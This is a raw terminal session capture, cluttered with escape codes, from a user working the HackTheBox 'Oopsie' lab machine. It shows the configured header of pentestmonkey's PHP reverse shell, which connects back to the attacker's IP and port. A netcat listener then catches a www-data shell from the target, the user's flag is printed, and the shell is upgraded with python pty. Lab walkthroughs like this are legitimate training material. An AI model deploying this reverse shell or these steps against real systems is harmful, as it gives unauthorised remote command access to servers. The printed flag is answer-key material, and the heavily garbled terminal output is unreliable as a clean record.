[2d[39m(B[m[?12l[?25h[?25l[?12l[?25h[3d[?25l[?12l[?25h[4d[?25l[?12l[?25h[5d[?25l[?12l[?25h[6d[?25l[?12l[?25h[7d[?25l[?12l[?25h[8d[?25l[?12l[?25h[9d[?25l[?12l[?25h[10d[?25l[?12l[?25h[11d[?25l[?12l[?25h[12d[?25l[?12l[?25h[13d[?25l[?12l[?25h[14d[?25l[?12l[?25h[15d[?25l[?12l[?25h[16d[?25l[?12l[?25h[17d[?25l[?12l[?25h7[2;17r8
+[1;20r[17;1H(B[0;1m[34m// but WITHOUT ANY WARRANTY; without even the implied warranty of[39m(B[m[?25l[?12l[?25h7[2;17r8
+[1;20r[17;1H(B[0;1m[34m// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the[39m(B[m[?25l[?12l[?25h7[2;17r8
+[1;20r[17;1H(B[0;1m[34m// GNU General Public License for more details.[39m(B[m[?25l[?12l[?25h7[2;17r8
+[1;20r[17;1H(B[0;1m[34m//[39m(B[m[?25l[18d[K[?12l[?25h7[2;18r8
+[1;20r[17;1H(B[0;1m[34m// You should have received a copy of the GNU General Public License along[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// with this program; if not, write to the Free Software Foundation, Inc.,[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m//[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// This tool may be used for legal purposes only.  Users take full responsibility[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// for any actions performed using this tool.  If these terms are not acceptable to[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// you, then do not use this tool.[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m//[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// You are encouraged to send comments, improvements or suggestions to[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// me at pentestmonkey@pentestmonkey.net[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m//[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// Description[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// -----------[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// This script will make an outbound TCP connection to a hardcoded IP and port.[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// The recipient will be given a shell running as the current user (apache normally).[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m//[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// Limitations[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// -----------[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// proc_open and stream_set_blocking require PHP version 4.3+, or 5+[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m//[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// Usage[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// -----[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H(B[0;1m[34m// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1Hset_time_limit (0);[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$VERSION[39m(B[m = (B[0;1m[33m"1.0"[39m(B[m;[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$ip[39m(B[m = (B[0;1m[33m'10.10.15.165'[39m(B[m;(B[0;1m[34m  // CHANGE THIS[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$port[39m(B[m = 1234;(B[0;1m[34m       // CHANGE THIS[39m(B[m[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$chunk_size[39m(B[m = 1400;[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$write_a[39m(B[m = null;[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$error_a[39m(B[m = null;[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$shell[39m(B[m = (B[0;1m[33m'uname -a; w; id; /bin/sh -i'[39m(B[m;[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$daemon[39m(B[m = 0;[?25l[?12l[?25h7[2;18r8[18d
+[1;20r[17;1H[36m$debug[39m(B[m = 0;[?25l[19d[J[20d[?12l[?25h[20;1H[?1049l[23;0;0t[?1l>[?2004l                                                                                                                                                                       ]0;kali@kali: ~/Hacking/hackthebox/TIER2/oopsie
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking/hackthebox/TIER2/oopsie[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[1m[31mi[0m[39m[1m[31mi[0m[39m[38;2;153;153;153mfconfig[39m[1m[36mi[1m[36mf[0m[39m[1m[31mi[1m[31mf[1m[31mc[0m[39m[1m[31mc[1m[31mo[0m[39m[1m[31mo[1m[31mf[0m[39m[39m [39m [39m [1m[31mf[1m[31mi[0m[39m[1m[31mf[0m[39m[0m[39m [1m[31mo[0m[39m[0m[39m [38;2;153;153;153mnfig[39m[1m[31mc[0m[39m[0m[39m [39m [39m [39m [39m [38;2;153;153;153monfig[39m[1m[36mi[1m[36mf[0m[39m[0m[39m [39m [39m [39m [39m [39m [38;2;153;153;153mconfig[39m[1m[31mi[1m[31mf[1m[31mc[0m[39m[1m[31mc[1m[31mo[0m[39m[1m[31mo[1m[31mn[0m[39m[1m[31mn[1m[31mf[0m[39m[1m[31mf[1m[31mi[0m[39m[0m[32mi[0m[32mf[0m[32mc[0m[32mo[0m[32mn[0m[32mf[0m[32mi[32mg[39m[H[2J[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking/hackthebox/TIER2/oopsie[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [32mifconfig[39m[K[?1l>[?2004l
+eth0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
+        ether b8:88:e3:5e:8f:c7  txqueuelen 1000  (Ethernet)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+        device interrupt 16  
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 354503  bytes 25388996 (24.2 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 354503  bytes 25388996 (24.2 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
+        inet 10.10.15.165  netmask 255.255.254.0  destination 10.10.15.165
+        inet6 dead:beef:2::11a3  prefixlen 64  scopeid 0x0<global>
+        inet6 fe80::d900:9dab:ffb4:37ea  prefixlen 64  scopeid 0x20<link>
+        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
+        RX packets 334955  bytes 59344563 (56.5 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 348622  bytes 23879089 (22.7 MiB)
+        TX errors 0  dropped 65253 overruns 0  carrier 0  collisions 0
+
+wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.1.35  netmask 255.255.255.0  broadcast 192.168.1.255
+        inet6 fe80::f6d1:877:a569:15d3  prefixlen 64  scopeid 0x20<link>
+        ether 20:68:9d:10:a3:94  txqueuelen 1000  (Ethernet)
+        RX packets 2006774  bytes 1587294912 (1.4 GiB)
+        RX errors 0  dropped 1583  overruns 0  frame 0
+        TX packets 1943623  bytes 301644264 (287.6 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+                                                                                                                                                                       ]0;kali@kali: ~/Hacking/hackthebox/TIER2/oopsie
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking/hackthebox/TIER2/oopsie[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[4mp[24m[4mp[24m[38;2;153;153;153mhp -S localhost:84[39m[18D[24m[1m[31mp[0m[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [17D[0m[39m[4mp[24m[4mp[24m[38;2;153;153;153mhp -S localhost:84[39m[18D[24m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [19D[4mc[24m[4mc[24m[38;2;153;153;153mp php-reverse-shell.php php-reverse-shell2.php[39m[46D[24m[32mc[32mp[39m[39m [39m[4mp[24m[4mp[39m[4mh[24m[4mh[39m[4mp[24m[4mp[39m[4m-[39m[4mr[39m[4me[39m[4mv[39m[4me[39m[4mr[39m[4ms[39m[4me[39m[4m-[39m[4ms[39m[4mh[39m[4me[39m[4ml[39m[4ml[39m[4m.[39m[4mp[39m[4mh[39m[4mp[24m[39m [39m[4mp[39m[4mh[39m[4mp[39m[4m-[39m[4mr[39m[4me[39m[4mv[39m[4me[39m[4mr[39m[4ms[39m[4me[39m[4m-[39m[4ms[39m[4mh[39m[4me[39m[4ml[39m[4ml[39m[4m2[39m[4m.[39m[4mp[39m[4mh[39m[4mp[24m[4mh[24m[24m [38;2;153;153;153mp[39m[4mp[24m[24m [39m [38;2;153;153;153mhp[39m[4m.[24m[24m [39m [39m [38;2;153;153;153mphp[39m[4m2[24m[24m [39m [39m [39m [38;2;153;153;153m.php[39m[4ml[24m[24m [39m [39m [39m [39m [38;2;153;153;153m2.php[39m[4ml[24m[24m [39m [39m [39m [39m [39m [38;2;153;153;153ml2.php[39m[4me[24m[24m [39m [39m [39m [39m [39m [39m [38;2;153;153;153mll2.php[39m[4mh[24m[24m [39m [39m [39m [39m [39m [39m [39m [8D[38;2;153;153;153mell2.php[39m[8D[4ms[24m[24m[38;2;153;153;153me[38;2;153;153;153ml[38;2;153;153;153ml[38;2;153;153;153m2[38;2;153;153;153m.[38;2;153;153;153mp[38;2;153;153;153mh[38;2;153;153;153mp[39m[39m [9D[4m-[24m[24m[38;2;153;153;153me[38;2;153;153;153ml[38;2;153;153;153ml[38;2;153;153;153m2[38;2;153;153;153m.[38;2;153;153;153mp[38;2;153;153;153mh[38;2;153;153;153mp[39m[39m [9D[4me[24m[24m[38;2;153;153;153me[38;2;153;153;153ml[38;2;153;153;153ml[38;2;153;153;153m2[38;2;153;153;153m.[38;2;153;153;153mp[38;2;153;153;153mh[38;2;153;153;153mp[39m[39m [9D[4ms[24m[24m[38;2;153;153;153me[38;2;153;153;153ml[38;2;153;153;153ml[38;2;153;153;153m2[38;2;153;153;153m.[38;2;153;153;153mp[38;2;153;153;153mh[38;2;153;153;153mp[39m[39m [9D[4mr[24m[24m[38;2;153;153;153me[38;2;153;153;153ml[38;2;153;153;153ml[38;2;153;153;153m2[38;2;153;153;153m.[38;2;153;153;153mp[38;2;153;153;153mh[38;2;153;153;153mp[39m[39m [9D[4me[24m[24m[38;2;153;153;153me[38;2;153;153;153ml[38;2;153;153;153ml[38;2;153;153;153m2[38;2;153;153;153m.[38;2;153;153;153mp[38;2;153;153;153mh[38;2;153;153;153mp[39m[39m [9D[4mv[24m[24m[38;2;153;153;153me[38;2;153;153;153ml[38;2;153;153;153ml[38;2;153;153;153m2[38;2;153;153;153m.[38;2;153;153;153mp[38;2;153;153;153mh[38;2;153;153;153mp[39m[39m [9D[4me[24m[24m[38;2;153;153;153me[38;2;153;153;153ml[38;2;153;153;153ml[38;2;153;153;153m2[38;2;153;153;153m.[38;2;153;153;153mp[38;2;153;153;153mh[38;2;153;153;153mp[39m[39m [9D[4mr[24m[24m[38;2;153;153;153me[38;2;153;153;153ml[38;2;153;153;153ml[38;2;153;153;153m2[38;2;153;153;153m.[38;2;153;153;153mp[38;2;153;153;153mh[38;2;153;153;153mp[39m[39m [9D[4m-[24m[24m[38;2;153;153;153me[38;2;153;153;153ml[38;2;153;153;153ml[38;2;153;153;153m2[38;2;153;153;153m.[38;2;153;153;153mp[38;2;153;153;153mh[38;2;153;153;153mp[39m[39m [9D[4mp[24m[24m[38;2;153;153;153me[38;2;153;153;153ml[38;2;153;153;153ml[38;2;153;153;153m2[38;2;153;153;153m.[38;2;153;153;153mp[38;2;153;153;153mh[38;2;153;153;153mp[39m[39m [9D[4mh[24m[24m[38;2;153;153;153me[38;2;153;153;153ml[38;2;153;153;153ml[38;2;153;153;153m2[38;2;153;153;153m.[38;2;153;153;153mp[38;2;153;153;153mh[38;2;153;153;153mp[39m[39m [9D[4mp[24m[24m [39m [39m [39m [39m [39m [39m [39m [39m [9D[38;2;153;153;153mhp-reverse-shell2.php[39m[21D[24m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [22D[38;2;153;153;153mphp-reverse-shell2.php[39m[22D[39mr[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [21Dr.php[?1l>[?2004l
+                                                                                                                                                                       ]0;kali@kali: ~/Hacking/hackthebox/TIER2/oopsie
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking/hackthebox/TIER2/oopsie[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[32mcp[39m [4mphp-reverse-shell.php[24m [4mrr.php[24m[4mh[24m[24m [38;2;153;153;153mp[39m[4mp[24m[24m [39m [38;2;153;153;153mhp[39m[4m.[24m[24m [39m [39m [38;2;153;153;153mphp[39m[4mr[24m[24m [39m [39m [39m [38;2;153;153;153m.php[39m[4mr[24m[24m [39m [39m [39m [39m [38;2;153;153;153mr.php[39m[24m [39m [39m [39m [39m [39m [38;2;153;153;153mrr.php[39m[39m [39m [39m [39m [39m [39m [38;2;153;153;153m rr.php[39m[4mh[24m[24m [39m [39m [39m [39m [39m [39m [39m [8D[38;2;153;153;153mp rr.php[39m[8D[4mp[24m[24m [39m [39m [39m [39m [39m [39m [39m [39m [9D[38;2;153;153;153mhp rr.php[39m[9D[4m.[24m[24m [39m [39m [39m [39m [39m [39m [39m [39m [39m [10D[38;2;153;153;153mphp rr.php[39m[10D[4ml[24m[24m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [11D[38;2;153;153;153m.php rr.php[39m[11D[4ml[24m[24m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [12D[38;2;153;153;153ml.php rr.php[39m[12D[4me[24m[24m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [13D[38;2;153;153;153mll.php rr.php[39m[13D[4mh[24m[24m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [14D[38;2;153;153;153mell.php rr.php[39m[14D[4ms[24m[24m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [15D[38;2;153;153;153mhell.php rr.php[39m[15D[4m-[24m[24m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [16D[38;2;153;153;153mshell.php rr.php[39m[16D[4me[24m[24m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [17D[38;2;153;153;153m-shell.php rr.php[39m[17D[4ms[24m[24m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [18D[38;2;153;153;153me-shell.php rr.php[39m[18D[4mr[24m[24m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [19D[38;2;153;153;153mse-shell.php rr.php[39m[19D[4me[24m[24m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [20D[38;2;153;153;153mrse-shell.php rr.php[39m[20D[4mv[24m[24m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [21D[38;2;153;153;153merse-shell.php rr.php[39m[21D[4me[24m[24m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [22D[38;2;153;153;153mverse-shell.php rr.php[39m[22D[4mr[24m[24m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [23D[38;2;153;153;153meverse-shell.php rr.php[39m[23D[4m-[24m[24m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [24D[38;2;153;153;153mreverse-shell.php rr.php[39m[24D[4mp[24m[24m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [25D[38;2;153;153;153m-reverse-shell.php rr.php[39m[25D[4mh[24m[24m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [26D[38;2;153;153;153mp-reverse-shell.php rr.php[39m[26D[4mp[24m[24m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [27D[38;2;153;153;153mhp-reverse-shell.php rr.php[39m[27D[24m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [28D[38;2;153;153;153mphp-reverse-shell.php rr.php[39m[28D[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [29D[38;2;153;153;153m php-reverse-shell.php rr.php[39m[29D[39m[4mc[24m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [30D[4mc[24m[38;2;153;153;153mp php-reverse-shell.php rr.php[39m[30D[24m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [31D[32mifconfig[39m[8D[32mn[32ma[32mn[32mo[39m[39m [39m[4mp[39m[4mh[39m[4mp[4m-reverse-shell.php[24m[26D[32mn[32mc[39m[39m [35m-[35mn[24m[35mv[24m[35ml[24m[35mp[39m[24m [24m1[24m2[24m3[24m4[24m [24m [24m [24m [24m [24m [24m [24m [24m [24m [24m [24m [24m [13D[H[2J[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking/hackthebox/TIER2/oopsie[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [32mnc[39m [35m-nvlp[39m 1234[K[?1l>[?2004l
+listening on [any] 1234 ...
+connect to [10.10.15.165] from (UNKNOWN) [10.129.172.19] 44232
+Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 22:46:36 up  1:59,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ ^L  ls
+bin
+boot
+cdrom
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+$ ls -l
+total 92
+drwxr-xr-x   2 root root  4096 Jul 28  2021 bin
+drwxr-xr-x   3 root root  4096 Oct 11  2021 boot
+drwxr-xr-x   2 root root  4096 Jul 28  2021 cdrom
+drwxr-xr-x  18 root root  3940 May 15 20:47 dev
+drwxr-xr-x  97 root root  4096 Oct 11  2021 etc
+drwxr-xr-x   3 root root  4096 Jul 28  2021 home
+lrwxrwxrwx   1 root root    33 Jan 27  2020 initrd.img -> boot/initrd.img-4.15.0-76-generic
+lrwxrwxrwx   1 root root    33 Oct 11  2021 initrd.img.old -> boot/initrd.img-4.15.0-76-generic
+drwxr-xr-x  21 root root  4096 Jul 28  2021 lib
+drwxr-xr-x   2 root root  4096 Jul 28  2021 lib64
+drwx------   2 root root 16384 Jan 23  2020 lost+found
+drwxr-xr-x   2 root root  4096 Jul 28  2021 media
+drwxr-xr-x   2 root root  4096 Jul 28  2021 mnt
+drwxr-xr-x   2 root root  4096 Jul 28  2021 opt
+dr-xr-xr-x 121 root root     0 May 15 20:47 proc
+drwx------   6 root root  4096 Oct 11  2021 root
+drwxr-xr-x  27 root root   880 May 15 20:47 run
+drwxr-xr-x   2 root root 12288 Jan 27  2020 sbin
+drwxr-xr-x   4 root root  4096 Jul 28  2021 snap
+drwxr-xr-x   2 root root  4096 Aug  5  2019 srv
+dr-xr-xr-x  13 root root     0 May 15 20:47 sys
+drwxrwxrwt   2 root root  4096 May 15 22:45 tmp
+drwxr-xr-x  10 root root  4096 Aug  5  2019 usr
+drwxr-xr-x  14 root root  4096 Jul 28  2021 var
+lrwxrwxrwx   1 root root    30 Jan 27  2020 vmlinuz -> boot/vmlinuz-4.15.0-76-generic
+lrwxrwxrwx   1 root root    30 Oct 11  2021 vmlinuz.old -> boot/vmlinuz-4.15.0-76-generic
+$ ls -l     ls
+bin
+boot
+cdrom
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+$ cd /home
+$ ls
+robert
+$ cd robert
+$ ls
+user.txt
+$ cat user.txt
+f2c74ee8db7983851ab2a96a44eb7981
+$ python3 -c 'import pty;pty.span("/bin/bash")'^[[D^[[D^[[D                            wan("/bin/bash")'
+Traceback (most recent call last):
+  File "<string>", line 1, in <module>
+AttributeError: module 'pty' has no attribute 'spwan'
+$ ls
+user.txt
+$ ^L  ^[[A^[[A        python3 -c 'import pty;ptw.spawn("/binn/bash")'
+Traceback (most recent call last):
+  File "<string>", line 1, in <module>
+NameError: name 'ptw' is not defined
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@oopsie:/home/robert$ h whoami
+whoami
+www-data
+www-data@oopsie:/home/robert$ tty
+tty
+/dev/pts/0
+www-data@oopsie:/home/robert$ ^L  ^L  clear
+clear
+TERM environment variable not set.
+www-data@oopsie:/home/robert$ TERM=xterm-256color
+TERM=xterm-256color
+www-data@oopsie:/home/robert$ exo port TERM=VT-100
+export TERM=VT-100
+www-data@oopsie:/home/robert$ ^L  clear
+clear
+'VT-100': unknown terminal type.
+www-data@oopsie:/home/robert$ export TERM=VT100
+export TERM=VT100
+www-data@oopsie:/home/robert$ clear
+clear
+'VT100': unknown terminal type.
+www-data@oopsie:/home/robert$ expor  t TERM=xterm-256color
+export TERM=xterm-256color
+www-data@oopsie:/home/robert$ ^L  ^L  clear
+clear
+[3J[H[2Jwww-data@oopsie:/home/robert$ tty
+tty
+/dev/pts/0
+www-data@oopsie:/home/robert$ ls
+ls
+user.txt
+www-data@oopsie:/home/robert$ ^L
+[H[2Jwww-data@oopsie:/home/robert$ 
+www-data@oopsie:/home/robert$ clear
+clear
+[3J[H[2Jwww-data@oopsie:/home/robert$ ls
+ls
+user.txt
+www-data@oopsie:/home/robert$ cd    cd /root
+cd /root
+bash: cd: /root: Permission denied
+www-data@oopsie:/home/robert$ ^Ll   clear
+clear
+[3J[H[2Jwww-data@oopsie:/home/robert$ ls
+ls
+user.txt
+www-data@oopsie:/home/robert$ exit
+exit
+exit
+$ exit
+                                                                                                                                                                       ]0;kali@kali: ~/Hacking/hackthebox/TIER2/oopsie
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking/hackthebox/TIER2/oopsie[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[1m[31me[0m[39m[1m[31me[0m[39m[38;2;153;153;153mxport nmap="~/Hacking/nmap.sh"[39m[30D[0m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [31D[H[2J[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking/hackthebox/TIER2/oopsie[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[4mc[24m[4mc[24m[38;2;153;153;153mp php-reverse-shell.php rr.php[39m[30D[24m[32mc[32md[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [29D[38;2;153;153;153m ..[39m[39m [39m[4m.[24m[4m.[39m[4m.[24m[4m.[24m[24m [38;2;153;153;153m.[39m[24m [39m [38;2;153;153;153m..[39m[39m [39m [38;2;153;153;153m ..[39m[39m[4mc[24m[39m [39m [39m [39m [4mc[24m[38;2;153;153;153mp php-reverse-shell.php rr.php[39m[30D[24m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [31D[H[2J[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking/hackthebox/TIER2/oopsie[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[32ml[39m[32ml[39m[38;2;153;153;153ms[39m[32ml[32ms[39m[32ml[39m[39m [32ml[39m[38;2;153;153;153ms[39m[39m [39m [4mc[24m[4mc[24m[38;2;153;153;153mp php-reverse-shell.php rr.php[39m[30D[24m[32mc[32md[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [29D[38;2;153;153;153m ..[39m[39m [39m[4m.[24m[4m.[39m[4m.[24m[?1l>[?2004l
+                                                                                                                                                                       ]0;kali@kali: ~/Hacking/hackthebox/TIER2
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking/hackthebox/TIER2[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[1m[31mc[0m[39m[1m[31mc[0m[39m[38;2;153;153;153md ..[39m[0m[32mc[32md[39m[39m [39m[4m.[24m[4m.[39m[4m.[24m[?1l>[?2004l
+                                                                                                                                                                       ]0;kali@kali: ~/Hacking/hackthebox
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking/hackthebox[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[4mc[24m[4mc[24m[38;2;153;153;153md ..[39m[24m[32mc[32md[39m[39m [39m[4m.[24m[4m.[39m[4m.[24m[?1l>[?2004l
+                                                                                                                                                                       ]0;kali@kali: ~/Hacking
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[32m.[39m[32m.[39m[38;2;153;153;153m/hh php[39m[39m[4m.[39m[4m/[24m[4m.[4m/[39m[4mh[24m[24m[32m.[24m[32m/[24m[32mh[32mh[39m[H[2J[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~/Hacking[0m[32m]
